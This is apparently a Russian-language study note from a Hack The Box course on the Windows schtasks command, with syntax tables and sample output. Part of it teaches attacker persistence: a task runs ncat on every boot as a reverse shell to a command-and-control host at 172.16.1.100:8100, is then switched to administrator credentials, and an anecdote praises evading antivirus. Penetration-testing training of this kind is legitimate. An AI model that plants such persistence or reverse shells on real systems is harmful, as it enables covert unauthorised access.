#windows #cmd #htb 

Запланированные задачи — отличный способ для администраторов обеспечить выполнение задач, которые они хотят запускать регулярно, но они также являются отличным местом для сохранения данных злоумышленниками. В этом разделе мы обсудим использование запланированных задач для:

- Узнайте, как проверить, какие задачи существуют.
- Создайте новую задачу, чтобы помочь нам автоматизировать действия или получить доступ к оболочке на хосте.

---

## Что такое запланированные задачи?

Планировщик задач позволяет администраторам выполнять рутинные задачи без необходимости запускать их вручную. Планировщик отслеживает на хосте определённый набор условий, называемых триггерами, и выполняет задачу при соблюдении этих условий.

**История из жизни: во время нескольких пентестов корпоративной среды я оказывался в ситуации, когда мне нужно было быстро настроить постоянство. Вместо того, чтобы делать что-то безумное или загружать на хост ещё один исполняемый файл, я решил поискать или создать запланированное задание, которое запускается при входе пользователя в систему или перезагрузке хоста. В этом запланированном задании я бы установил триггер для открытия нового сокета с помощью PowerShell, обратившись к своей инфраструктуре управления и контроля. Это гарантировало бы, что я смогу вернуться, если потеряю доступ к этому хосту. Если бы мне повезло, то при выполнении выбранной мной задачи я мог бы также получить оболочку на уровне SYSTEM, одновременно повысив свои привилегии. Это быстро обеспечило бы доступ к хосту без срабатывания антивирусов или систем предотвращения потери данных.**

#### Триггеры, которые могут запустить запланированную задачу

- Когда происходит определенное системное событие.
- В определенное время.
- В определенное время по ежедневному расписанию.
- В определенное время по еженедельному расписанию.
- В определенное время по ежемесячному графику.
- В определенное время по ежемесячному расписанию дней недели.
- Когда компьютер переходит в состояние ожидания.
- Когда задача будет зарегистрирована.
- Когда система загружается.
- Когда пользователь входит в систему.
- Когда сеанс сервера терминалов изменяет состояние.

Этот список триггеров обширен и предоставляет нам множество вариантов для выполнения задач. Теперь, когда мы знаем, что такое запланированные задачи и что может сделать их выполнимыми, пришло время рассмотреть их использование.

---

## Как использовать Schtasks

В разделах, приведённых ниже, мы подробно рассмотрим, как можно использовать команду `schtasks` в полной мере. Кроме того, по мере рассмотрения мы будем приводить отформатированную таблицу с синтаксисом для каждого действия.

Обратите внимание, что приведённые здесь разделы не являются исчерпывающими. Некоторые повторяющиеся параметры были опущены. Обязательно проверьте меню справки, `/?` чтобы увидеть полный список возможных вариантов.

#### Отображение Запланированных задач:

#### Синтаксис запроса

| **Экшен** | **Параметр** | **Описание**                                                                                                                                                                                                                                               |
| --------- | ------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Query`   |              | Выполняет поиск на локальном или удалённом хосте, чтобы определить, какие запланированные задачи существуют. Из-за ограничений доступа не все задачи могут быть видны обычному пользователю.                                                               |
|           | /fo          | Задаёт параметры форматирования. Мы можем указать, чтобы результаты отображались в `Table, List, or CSV` выводе.                                                                                                                                           |
|           | /v           | Включает режим подробного описания, отображая `advanced properties` в отображаемых задачах при использовании параметра вывода «Список» или «CSV».                                                                                                          |
|           | /nh          | Упрощает вывод данных с использованием формата вывода «Таблица» или «CSV». Этот переключатель `removes` `column headers`.                                                                                                                                  |
|           | /s           | Задаёт DNS-имя или IP-адрес хоста, к которому мы хотим подключиться. `Localhost` — это `default` указанный параметр. Если используется `/s`, мы подключаемся к удалённому хосту и должны отформатировать его как «\\хост».                                 |
|           | /u           | Этот параметр указывает schtasks выполнить следующую команду с `permission set` вместо указанного `user`                                                                                                                                                   |
|           | /p           | Задаёт `password` для выполнения команды, когда мы указываем пользователя для запуска задачи. Пользователи должны быть членами группы «Администраторы» на хосте (или в домене). Значения `u` и `p` действительны только при использовании с параметром `s` |

Мы можем просмотреть задачи, которые уже существуют на нашем хосте, с помощью команды `schtasks` следующим образом:

  Работа с запланированными задачами

```cmd-session
C:\htb> SCHTASKS /Query /V /FO list

Folder: \  
HostName:                             DESKTOP-Victim
TaskName:                             \Check Network Access
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-Victim\htb-admin
Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8
Start In:                             N/A
Comment:                              quick ping check to determine connectivity. If it passes, other tasks will kick off. If it fails, they will delay.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          tru7h
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

<SNIP>
```

Объединение параметров в цепочку с помощью `Query` позволяет преобразовать стандартный массив в список с расширенными настройками. На приведённом выше примере показано, как будут выглядеть задачи в формате списка.

#### Создайте новую запланированную задачу:

#### Синтаксис создания

| **Экшен** | **Параметр** | **Описание**                                                                                                                           |
| --------- | ------------ | -------------------------------------------------------------------------------------------------------------------------------------- |
| `Create`  |              | Планирует выполнение задачи.                                                                                                           |
|           | /sc          | Устанавливает тип расписания. Оно может быть поминутным, почасовым, еженедельным и т. д. Обязательно проверьте параметры.              |
|           | /tn          | Задаёт имя для задачи, которую мы создаём. У каждой задачи должно быть уникальное имя.                                                 |
|           | /tr          | Устанавливает триггер и задачу, которые должны быть выполнены. Это может быть исполняемый файл, скрипт или пакетный файл.              |
|           | /s           | Указывает хост для запуска, как и в запросе.                                                                                           |
|           | /u           | Указывает локального пользователя или пользователя домена, который будет использоваться                                                |
|           | /p           | Устанавливает пароль, указанный пользователем.                                                                                         |
|           | /mo          | Позволяет настроить модификатор для запуска по заданному расписанию. Например, каждые 5 часов через день.                              |
|           | /rl          | Позволяет ограничить права доступа к задаче. Здесь доступны опции `limited` доступа и `Highest`. Ограниченный — значение по умолчанию. |
|           | /z           | Установит задачу на удаление после завершения ее действий.                                                                             |

Создать новое запланированное задание довольно просто. Как минимум, мы должны указать следующее:

- `/create` : рассказать ему, что мы делаем
- `/sc` : мы должны установить график
- `/tn` : мы должны задать имя
- `/tr` : мы должны дать ему возможность предпринять какие-то действия

Всё остальное необязательно. Ниже приведён пример того, как мы можем создать задачу, которая поможет нам получить оболочку.

#### Создание Новой задачи

  Работа с запланированными задачами

```cmd-session
C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```

**Отличный пример использования schtasks — обратный вызов при каждой загрузке хоста. Это гарантирует, что если наша оболочка выйдет из строя, мы получим обратный вызов от хоста при следующей перезагрузке, что повышает вероятность того, что мы потеряем доступ к хосту только на короткое время, если что-то произойдёт или хост будет выключен. Мы можем создать или изменить новую задачу, добавив новый триггер и действие. В нашей задаче выше мы с помощью планировщика задач локально запускаем Ncat, который мы поместили в каталог AppData пользователя, и подключаемся к хосту `172.16.1.100` на порту `8100`. В случае успешного выполнения этот запрос на подключение должен соединиться с нашей системой управления (Metasploit, Empire и т. д.) и предоставить нам доступ к оболочке.**

Теперь давайте посмотрим, как будет выглядеть изменение задачи.

### Изменение свойств запланированной задачи

#### Изменить Синтаксис

| **Экшен** | **Параметр** | **Описание**                                            |
| --------- | ------------ | ------------------------------------------------------- |
| `Change`  |              | Позволяет изменять существующие запланированные задачи. |
|           | /tn          | Определяет задачу по изменению                          |
|           | /tr          | Изменяет программу или действие, выполняемое задачей.   |
|           | /ENABLE      | Измените состояние задачи на "Включено".                |
|           | /DISABLE     | Измените состояние задачи на Отключенное.               |

Хорошо, теперь предположим, что мы нашли `hash` пароля локального администратора и хотим использовать его для запуска нашей оболочки Ncat. Если что-то пойдёт не так, мы можем изменить задачу, добавив учётные данные для её использования.

  Работа с запланированными задачами

```cmd-session
C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.

```

Теперь, чтобы убедиться, что наши изменения вступили в силу, мы можем запросить конкретную задачу с помощью параметра `/tn` и посмотреть:

  Работа с запланированными задачами

```cmd-session
C:\htb> schtasks /query /tn "My Secret Task" /V /fo list 

Folder: \
HostName:                             DESKTOP-Victim
TaskName:                             \My Secret Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-victim\htb-admin
Task To Run:                          C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up

<SNIP>  
```

Похоже, что наши изменения были успешно сохранены. Управлять задачами и вносить изменения довольно просто. Нам нужно убедиться, что синтаксис правильный, иначе задача может не запуститься. Если мы хотим убедиться, что всё работает, мы можем использовать параметр `/run` для немедленного запуска задачи. На данный момент у нас есть `queried, created, and changed` задач. Давайте посмотрим, как их удалить.

### Удалить запланированную задачу (задачи)

#### Синтаксис удаления

| **Экшен** | **Параметр** | **Описание**                                                        |
| --------- | ------------ | ------------------------------------------------------------------- |
| `Delete`  |              | Удаление задачи из расписания                                       |
|           | /tn          | Определяет задачу для удаления.                                     |
|           | /s           | Указывает имя или IP-адрес, с которого будет удалена задача.        |
|           | /u           | Указывает пользователя, от имени которого будет выполняться задача. |
|           | /p           | Указывает пароль для запуска задачи под именем.                     |
|           | /f           | Останавливает выдачу предупреждения о подтверждении.                |

  Работа с запланированными задачами

```cmd-session
C:\htb> schtasks /delete  /tn "My Secret Task" 

WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
```

Выполнить `schtasks /delete` довольно просто. Следует отметить, что если мы не укажем параметр `/F`, то, как и в приведённом выше примере, нам будет предложено ввести данные. Использование `/F` приведёт к удалению задачи и скрытию сообщения.

---

Задачи Schtasks могут стать отличным способом использовать хост для выполнения действий, необходимых нам как администраторам и пентестерам. Потратьте немного времени на то, чтобы попрактиковаться в создании, изменении и удалении задач. К настоящему моменту мы уже должны хорошо разбираться в `cmd.exe` и его работе. Давайте повысим уровень и начнём работать в `PowerShell`!

[Perplexity](obsidian://open?vault=Obsidian%20Vault&file=Base%2FHTB%2F%D0%9F%D1%80%D0%B0%D0%BA%D1%82%D0%B8%D0%BA%D0%B0%20%D0%BF%D0%BE%20%D0%B7%D0%B0%D0%B4%D0%B0%D1%87%D0%B0%D0%BC)
